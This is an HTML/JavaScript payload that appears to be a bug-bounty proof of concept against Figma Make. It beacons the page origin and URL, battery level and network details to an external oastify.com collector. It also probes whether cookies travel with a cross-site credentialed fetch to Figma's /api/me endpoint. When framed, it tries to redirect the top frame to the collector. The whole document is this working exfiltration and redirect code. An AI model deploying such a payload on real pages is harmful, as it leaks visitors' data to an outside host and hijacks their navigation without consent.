<script>
  var OOB = "https://weenb5aa9z1cfceeqn1slq1llcr3f53u.oastify.com";

  function log(msg) {
    document.getElementById("log").textContent += msg + "\n";
  }

  function send(tag, data) {
    new Image().src = OOB + "/" + tag + "?d=" +
  encodeURIComponent(JSON.stringify(data)).slice(0, 1800);
    log("[SENT] " + tag + " -> " + JSON.stringify(data));
  }

  async function run() {
    log("Origin: " + window.location.origin);
    send("origin", { origin: window.location.origin, href: window.location.href });

    // Battery
    if (navigator.getBattery) {
      var b = await navigator.getBattery();
      send("battery", { level: b.level, charging: b.charging });
    }

    // Network
    var c = navigator.connection;
    if (c) {
      send("network", { type: c.effectiveType, downlink: c.downlink, rtt: c.rtt });
    }

    // Confirm Lax wall: fetch to figma.com will have no cookies
    send("lax_test", { note: "about to fetch figma.com cross-site, cookies will be absent"
  });
    try {
      await fetch("https://www.figma.com/api/me", { credentials: "include", mode: "no-cors"
   });
      send("lax_result", { reached: true, cookies_sent: false, reason: "SameSite=Lax blocks
   cross-site subresource" });
    } catch(e) {
      send("lax_result", { reached: false, error: e.message });
    }

    // Top-frame nav (open redirect) — only trigger if inside iframe
    if (window.top !== window) {
      send("redirect_attempt", { target: OOB + "/top_nav_hit" });
      try {
        window.top.location.href = OOB + "/top_nav_hit";
      } catch(e) {
        var a = document.createElement("a");
        a.href = OOB + "/top_nav_hit";
        a.target = "_top";
        document.body.appendChild(a);
        a.click();
      }
    } else {
      send("redirect_skipped", { reason: "not in iframe, would work in Figma Make" });
    }
  }

  run();
  </script>
